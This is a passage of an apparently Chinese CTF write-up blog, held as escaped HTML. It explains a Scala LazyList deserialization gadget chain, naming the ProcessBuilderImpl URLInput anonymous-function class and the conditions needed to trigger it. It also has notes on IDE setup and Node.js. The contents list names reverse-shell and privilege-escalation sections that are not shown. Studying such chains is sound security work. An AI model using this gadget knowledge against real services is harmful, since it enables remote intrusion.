class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>首先调用默认的readObject</li>\n<li>初始化一个缓冲区，存储已经计算出来的元素</li>\n<li>判断是否到了序列化的末尾<ul>\n<li>如果没有，就添加到Init缓冲区。<code>asInstanceOf</code>是Scala中的一个类型转换操作符，用于将一个对象强制转换为指定的类型。这里就是转换成A类型</li>\n<li>如果到了末尾，就跳出循环</li>\n</ul>\n</li>\n<li>将没有计算出来的元素，类型转换为lazylisy</li>\n<li>使用++方法连接init和tail</li>\n</ul>\n<h4 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h4><pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">object</span> Main <span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">class</span> test<span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> func<span class=\"token operator\">:</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">=></span><span class=\"token builtin\">Int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  \n  <span class=\"token keyword\">def</span> show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Unit</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    func<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li><p>这里的func是一个无参函数，返回类型为Int，在show中调用了这个函数</p>\n</li>\n<li><p>相当于整个类的构造方法是一个无参函数</p>\n</li>\n<li><p>可以像下面这样用</p>\n</li>\n</ul>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">val</span> obj <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> test<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">=></span> <span class=\"token punctuation\">&#123;</span>\n  println<span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello, world!\"</span><span class=\"token punctuation\">)</span>\n  <span class=\"token number\">42</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n\nobj<span class=\"token punctuation\">.</span>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 执行传入的函数，输出 \"Hello, world!\" 并返回 42</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"匿名函数-vs-正常函数\"><a href=\"#匿名函数-vs-正常函数\" class=\"headerlink\" title=\"匿名函数 vs 正常函数\"></a>匿名函数 vs 正常函数</h4><p><strong>匿名函数</strong></p>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token comment\">// 定义一个接受两个整数参数并返回它们的和的匿名函数</span>\n<span class=\"token keyword\">val</span> addition<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">Int</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">Int</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">=></span> <span class=\"token builtin\">Int</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span> <span class=\"token keyword\">=></span> x <span class=\"token operator\">+</span> y\n\n<span class=\"token comment\">// 使用匿名函数进行计算</span>\n<span class=\"token keyword\">val</span> result <span class=\"token operator\">=</span> addition<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">// 打印结果</span>\nprintln<span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 输出: 8</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>val addition: <strong>(Int, Int) &#x3D;&gt; Int</strong> &#x3D; (x, y) &#x3D;&gt; x + y   </p>\n<p>这里的addition是变量名，并不是函数名</p>\n<p>前面看成一部分，后面堪称一部分，也就是定义一个函数，参数类型为Int Int，返回值为Int</p>\n<p><strong>正常函数</strong></p>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">def</span> add<span class=\"token punctuation\">(</span>x<span class=\"token operator\">:</span> <span class=\"token builtin\">Int</span><span class=\"token punctuation\">,</span> y<span class=\"token operator\">:</span> <span class=\"token builtin\">Int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Int</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n  x <span class=\"token operator\">+</span> y\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"Scala性质\"><a href=\"#Scala性质\" class=\"headerlink\" title=\"Scala性质\"></a>Scala性质</h4><p>scala中的无参匿名函数都会被编译器转换为实现了Function0接口的实例对象</p>\n<p><strong>说人话：无参的函数会实现Function0接口，Function0接口中定义了apply()方法，所以在（)的时候，就会调用Function)的apply方法</strong></p>\n<ol>\n<li>测试无参匿名函数</li>\n</ol>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">object</span> Main <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">class</span> test<span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> func<span class=\"token operator\">:</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">=></span><span class=\"token builtin\">Int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">def</span> show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">Unit</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n      func<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>对这个代码点击左键，发现它认为func是Function0的apply方法</li>\n</ul>\n<p><img src=\"/../SCTF/image-20230831154600032.png\" alt=\"image-20230831154600032\"></p>\n<p><img src=\"/../SCTF/image-20230831154822266.png\" alt=\"image-20230831154822266\"></p>\n<ol start=\"2\">\n<li>用scalac进行编译<code>scalac a.scala</code>，生成文件如下,也就是class a main对象  test方法</li>\n</ol>\n<p><img src=\"/../SCTF/image-20230901132629733.png\" alt=\"image-20230901132629733\"></p>\n<ol start=\"3\">\n<li>用javap进行反编译，发现func()方法是Function0类型的，也就印证了上面说的</li>\n</ol>\n<p><img src=\"/../SCTF/image-20230901133435055.png\" alt=\"image-20230901133435055\"></p>\n<p><img src=\"/../SCTF/image-20230901134138949.png\" alt=\"image-20230901134138949\"></p>\n<ul>\n<li><p>private[process]：表示私有级别访问的类</p>\n</li>\n<li><p><code>stream: =&gt; scala.sys.process.processInternal.InputStream</code><br><code>scala.sys.process.processInternal.InputStream</code>：它表示一个惰性求值的输入流。<code>=&gt;</code> 符号表示这是一个按需求值的参数，也称为 call-by-name 参数。这意味着在实际使用时，<code>stream</code> 参数会被按需求进行求值或调用</p>\n</li>\n<li><p>这是个类，第一个参数就是它的构造器的参数</p>\n</li>\n</ul>\n<ol start=\"4\">\n<li>组建类</li>\n</ol>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">class</span> a<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">def</span> msg<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">String</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">\"i am class a\"</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> b <span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> <span class=\"token keyword\">=></span><span class=\"token builtin\">String</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//这里注意冒号和等号之间的空格</span>\n<span class=\"token keyword\">class</span> c<span class=\"token punctuation\">(</span>url<span class=\"token operator\">:</span>a<span class=\"token punctuation\">)</span> <span class=\"token keyword\">extends</span> b<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">.</span>msg<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>用scalac编译，得到下面的结果</p>\n<p><img src=\"/../SCTF/image-20230901134657856.png\" alt=\"image-20230901134657856\"></p>\n<ul>\n<li>上面折腾了一大堆，效果就是可以调用url的openStream方法</li>\n</ul>\n<p><img src=\"/../SCTF/image-20230901141420894.png\" alt=\"image-20230901141420894\"></p>\n<h4 id=\"思路-2\"><a href=\"#思路-2\" class=\"headerlink\" title=\"思路\"></a>思路</h4><p>反序列化的最后一步是LazyState:  () &#x3D;&gt; LasyList.State[A]</p>\n<p>所以也就是我可以构造一个无参的匿名函数，这个函数是恶意的</p>\n<p><strong>问题：那如何找到一个恶意的匿名函数呢？</strong></p>\n<ul>\n<li>已知Scala中所有无参的匿名函数都实现了Function0接口</li>\n</ul>\n<p>看一下payload：</p>\n<p><code>scala.sys.process.ProcessBuilderImpl\\$URLInput$$anonfun\\$\\$lessinit\\$greater\\$1</code></p>\n<p><strong>问题：payload为什么是这样的呢？</strong></p>\n<pre class=\"line-numbers language-scala\" data-language=\"scala\"><code class=\"language-scala\"><span class=\"token keyword\">class</span> a<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">def</span> msg<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token builtin\">String</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">\"i am class a\"</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> b <span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> <span class=\"token keyword\">=></span><span class=\"token builtin\">String</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//这里注意冒号和等号之间的空格</span>\n<span class=\"token keyword\">class</span> c<span class=\"token punctuation\">(</span>url<span class=\"token operator\">:</span>a<span class=\"token punctuation\">)</span> <span class=\"token keyword\">extends</span> b<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">.</span>msg<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">/**\n这行代码的意思是给c的构造器是a类型 接收参数为url,\n给b的构造器传一个函数url.msg()\n*/</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>类<code>b</code>的构造函数接受一个按需传递的参数<code>name</code>，该参数的类型是<code>String</code>。当创建<code>b</code>类的实例时，可以在构造函数中传递一个<strong>表达式或函数</strong>，而不是一个具体的字符串值。只有当<code>name</code>参数在类的方法或属性中被使用时，它才会被求值。</li>\n<li>当类的关系是上述关系时，此时给b中传入一个函数，由于惰性求值c中调用a的方法，用scalac编译，就会生成和payload一样的结构</li>\n<li>leesinit$greater：表示是在构造器中定义的匿名函数</li>\n</ul>\n<p>![image-20230901134657856](..&#x2F;2023-9-1 SCTF 154906&#x2F;image-20230901134657856.png)</p>\n<ul>\n<li>所以payload要这样构造，此时就可以调用url的openStream方法</li>\n</ul>\n<p>![image-20230901141420894](..&#x2F;2023-9-1 SCTF 154906&#x2F;image-20230901141420894.png)</p>\n<p><strong>问题：上面只是用类比的方法解释了可能是这样的，具体是因为啥呢？</strong></p>\n<ul>\n<li>因为传名参数处接受的是个函数，这个函数可以理解成匿名函数</li>\n<li>又因为所有的匿名函数都实现了Function0，所以这里也就解释了为什么，它可以传到lazyState处，LazyState的类型也是Function0</li>\n</ul>\n<p><strong>综上所述：Scala反序列化漏洞的条件是</strong></p>\n<ol>\n<li>作为传名参数被使用</li>\n<li>作为父类的构造参数</li>\n<li>存在于受害者服务环境中的classpath中</li>\n</ol>\n<p><code>scala.sys.process.ProcessBuilderImpl$URLInput$$anonfun$$lessinit$greater$1</code></p>\n<p>是 Scala 标准库中的一个类的完整名称，它实现了 <code>ProcessBuilderImpl</code> 类中的 <code>URLInput</code> 特质的匿名函数</p>\n<p><img src=\"/../SCTF/image-20230901131137839.png\" alt=\"image-20230901131137839\"></p>\n<p><img src=\"/../SCTF/image-20230901131154676.png\" alt=\"image-20230901131154676\"></p>\n<details class=\"custom-details\">\n<summary>隐藏内容</summary>\n<p>Scala编译器在编译Scala代码时，会将<strong>匿名函数转换成Java字节码</strong>，这样就可以在Java虚拟机上运行。</p>\n<p>为了与Java兼容，Scala编译器会为每个匿名函数生成一个类，并给这个类一个特殊的名字，通常是anonfun加上一些数字和符号。这个类名的作用是唯一地标识这个匿名函数，以便在运行时调用。</p>\n\n</details>\n<p>$URLInput:表示ProcessBuilderImpl的内部类</p>\n<p>$$anonfun:表示匿名函数的前缀，表示这是一个自动生成的类。</p>\n<p>$$lessinit$greater:是<code>&lt;init&gt;</code>的转义形式，<strong>表示这个匿名函数是在构造器中定义的</strong>。</p>\n<p>$1:是匿名函数的序号，表示这是第一个匿名函数。</p>\n<p><img src=\"/../SCTF/image-20230901151212459.png\" alt=\"image-20230901151212459\"></p>\n<ul>\n<li>我在这里加了scala SDK 才可以看到LazyList的源码</li>\n</ul>\n<p><img src=\"/../SCTF/image-20230901154323999.png\" alt=\"image-20230901154323999\"></p>\n<ul>\n<li>这个和下面是一样的，也是无参的构造器，无参的默认都实现了Funciton0</li>\n</ul>\n<p>\t</p>\n<p><img src=\"/../SCTF/image-20230901154049787.png\" alt=\"image-20230901154049787\"></p>\n<p>这就相当于是一个无参的构造器，返回值是LaztList.State[A]</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">LazyList</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">LazyLisy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n          <span class=\"token keyword\">return</span> <span class=\"token class-name\">LazyList<span class=\"token punctuation\">.</span>State</span><span class=\"token punctuation\">[</span><span class=\"token class-name\">A</span><span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">&#125;</span>\n  \n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>也就是说 我要找到<strong>一个实现了Function0的类</strong>，就能套上了</li>\n</ul>\n<p>查看poc发现使用 的是</p>\n<h3 id=\"payload构造过程\"><a href=\"#payload构造过程\" class=\"headerlink\" title=\"payload构造过程\"></a>payload构造过程</h3><ol>\n<li>首先new LazyList</li>\n</ol>\n<p><strong>Funciton：apply()</strong></p>\n<p>如果有一个 <code>Function&lt;Integer, String&gt;</code> 类型的函数对象，表示接受一个整数参数并返回一个字符串结果，那么可以使用 <code>apply</code> 方法来执行函数的逻辑</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token class-name\">Function</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">></span></span> function <span class=\"token operator\">=</span> num <span class=\"token operator\">-></span> <span class=\"token string\">\"Result: \"</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">String</span> result <span class=\"token operator\">=</span> function<span class=\"token punctuation\">.</span><span class=\"token function\">apply</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 输出：Result: 10</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>所以这个apply是执行了这个函数，程序跳转到了这里</p>\n<p><img src=\"/../SCTF/image-20230903151442023.png\" alt=\"image-20230903151442023\"></p>\n<p><code>ProcessBuilder$.class</code>它表示的是ProcessBuilder的伴生对象，也就是下面这个</p>\n<p><img src=\"/../SCTF/image-20230903160325419.png\" alt=\"image-20230903160325419\"></p>\n<p>如果我把它改成<code>ProcessBuilder.class</code>，就会变成</p>\n<p><img src=\"/../SCTF/image-20230903160428223.png\" alt=\"image-20230903160428223\"></p>\n<h3 id=\"maven\"><a href=\"#maven\" class=\"headerlink\" title=\"maven\"></a>maven</h3><pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependencies</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token comment\">&lt;!-- scala --></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>org.scala-lang<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>scala-library<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>2.13.9<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependencies</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>我添加了一个Maven依赖，并且在add framework support中加了scala，然后我download sources，此时就不提示sources not dound了</li>\n<li>此时看到了正常的scala源码</li>\n</ul>\n<p>![image-20230902201937753](..&#x2F;2023-9-1 SCTF 154906&#x2F;image-20230902201937753.png)</p>\n<h2 id=\"idea\"><a href=\"#idea\" class=\"headerlink\" title=\"idea\"></a>idea</h2><p><strong>问题：从Github上下载的项目即使有main也不能直接运行，为啥？</strong></p>\n<p>是因为没有标记为sources root，idea就不会对其添加运行代码相关的配置</p>\n<ul>\n<li><p>“Sources Root”（源码根目录）：将目录标记为项目的源代码目录。</p>\n</li>\n<li><p>“Test Sources Root”（测试源码根目录）：将目录标记为项目的测试代码目录。</p>\n</li>\n<li><p>“Resources Root”（资源根目录）：将目录标记为项目的资源文件目录，如配置文件、图像等。</p>\n</li>\n<li><p>“Excluded”（排除目录）：将目录从项目的构建和搜索范围中排除。</p>\n</li>\n</ul>\n<p><img src=\"/../SCTF/image-20230903091417300.png\" alt=\"image-20230903091417300\"></p>\n<h3 id=\"格式化代码\"><a href=\"#格式化代码\" class=\"headerlink\" title=\"格式化代码\"></a>格式化代码</h3><p>CTRL+ alt + L</p>\n<h1 id=\"SCTF-an4er-monitor\"><a href=\"#SCTF-an4er-monitor\" class=\"headerlink\" title=\"SCTF an4er_monitor\"></a>SCTF an4er_monitor</h1><p> <code>http.d.ts</code> 文件中，<code>socketPath?: string | undefined;</code> 是用于描述 <code>http.request()</code> 和 <code>https.request()</code> 方法的参数 <code>options</code> 中的 <code>socketPath</code> 字段。</p>\n<p>具体解释如下：</p>\n<p><code>socketPath</code> 是一个可选的字符串类型字段，表示要使用的 Unix 套接字路径。它用于在发起 HTTP 或 HTTPS 请求时指定与服务器通信的 Unix 套接字路径。</p>\n<p>当请求的目标是通过 Unix 套接字进行通信时，可以使用 <code>socketPath</code> 字段来指定服务器的 Unix 套接字路径。这样，请求将通过该套接字与服务器建立连接，并进行后续的 HTTP 或 HTTPS 通信。</p>\n<p>例如，可以在发起请求时设置 <code>socketPath</code> 字段如下：</p>\n<p>typescript</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> options <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token literal-property property\">socketPath</span><span class=\"token operator\">:</span> <span class=\"token string\">'/var/run/myserver.sock'</span><span class=\"token punctuation\">,</span>\n  <span class=\"token comment\">// 其他请求选项...</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> req <span class=\"token operator\">=</span> http<span class=\"token punctuation\">.</span><span class=\"token function\">request</span><span class=\"token punctuation\">(</span>options<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">res</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token comment\">// 处理响应...</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nreq<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在上述示例中，通过将 <code>socketPath</code> 字段设置为 <code>&#39;/var/run/myserver.sock&#39;</code>，请求将使用该 Unix 套接字路径与服务器建立连接。</p>\n<p>需要注意的是，<code>socketPath</code> 字段是在 <code>http.d.ts</code> 类型声明文件中定义的，用于在 TypeScript 项目中提供类型信息和类型检查支持，以确保在开发过程中使用正确的类型和参数。</p>\n<p>启动redis服务器</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">service</span> redis-server start <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n\n\n<p><img src=\"/../SCTF/image-20230803100159678.png\" alt=\"image-20230803100159678\"></p>\n<ul>\n<li>这里的obj已经是<code>object</code>了，是{urls}的<code>__proto__</code></li>\n</ul>\n<p>在 Node.js 中，req.query 对象表示客户端发送的 HTTP 请求中的查询参数（query parameters）。查询参数是在 URL 中以 “?” 符号开始的字符串，通常用于向服务器传递键值对。</p>\n<p>例如，如果客户端发送以下 HTTP 请求：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">GET /search?q<span class=\"token operator\">=</span>JavaScript<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">limit</span><span class=\"token operator\">=</span><span class=\"token number\">10</span> HTTP/1.1\nHost: example.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n\n<p>那么 req.query 对象将包含以下属性：</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token literal-property property\">q</span><span class=\"token operator\">:</span> <span class=\"token string\">'JavaScript'</span><span class=\"token punctuation\">,</span>\n  <span class=\"token literal-property property\">limit</span><span class=\"token operator\">:</span> <span class=\"token string\">'10'</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n\n\n<p>一旦您启动了 Docker 容器，您可以在容器中运行各种应用程序和服务，包括 Nginx 和 Redis。您可以通过容器的 IP 地址、主机名或映射的端口号与容器内运行的应用程序进行通信。</p>\n","text":"SCTF ezcheck1n思路 hint提示：find the way to flag.Looks like there are two containers with an evil P in the configuration file of the frontend se...","link":"","photos":[],"count_time":{"symbolsCount":"40k","symbolsTime":"36 mins."},"categories":[],"tags":[{"name":"CTF","slug":"CTF","count":3,"path":"api/tags/CTF.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#SCTF-ezcheck1n\"><span class=\"toc-text\">SCTF ezcheck1n</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Boogipop%E5%B8%88%E5%82%85%E7%9A%84wp\"><span class=\"toc-text\">Boogipop师傅的wp</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#SCTF-fumo-backdoor\"><span class=\"toc-text\">SCTF fumo_backdoor</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-1\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#py%E8%84%9A%E6%9C%AC\"><span class=\"toc-text\">py脚本</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#SCTF-pypyp\"><span class=\"toc-text\">SCTF pypyp?</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\"><span class=\"toc-text\"></span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#session-upload-progress%E5%BC%80%E5%90%AFsession\"><span class=\"toc-text\">session.upload_progress开启session</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#php%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1\"><span class=\"toc-text\">php源码审计</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#new-type-properties-0-properties-1\"><span class=\"toc-text\">new $type($properties[0],$properties[1])</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#flask%E5%BC%80%E5%90%AF%E4%BA%86debug%E2%80%93-pin%E7%A0%81rce\"><span class=\"toc-text\">flask开启了debug–&gt;pin码rce</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#soapclient%E5%8F%91%E5%8C%85%EF%BC%8C%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">soapclient发包，反弹shell</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#suid-%E6%8F%90%E6%9D%83-curl\"><span class=\"toc-text\">suid 提权 curl</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#SCTF-hellojava\"><span class=\"toc-text\">SCTF hellojava</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#java8%E3%80%81java11%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE\"><span class=\"toc-text\">java8、java11环境配置</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#jar%E5%8C%85%E5%8F%8D%E7%BC%96%E8%AF%91\"><span class=\"toc-text\">jar包反编译</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%95%B4%E4%B8%AA%E4%BB%A3%E7%A0%81%E7%9A%84%E5%90%AB%E4%B9%89\"><span class=\"toc-text\">整个代码的含义</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9C%80%E6%9C%80%E6%9C%80%E5%85%B3%E9%94%AE%E7%9A%84%E7%82%B9\"><span class=\"toc-text\">最最最关键的点</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%94%9F%E6%88%90payload\"><span class=\"toc-text\">生成payload</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Technical-details\"><span class=\"toc-text\">Technical details</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Scala\"><span class=\"toc-text\">Scala</span></a><ol class=\"toc-child\"><li 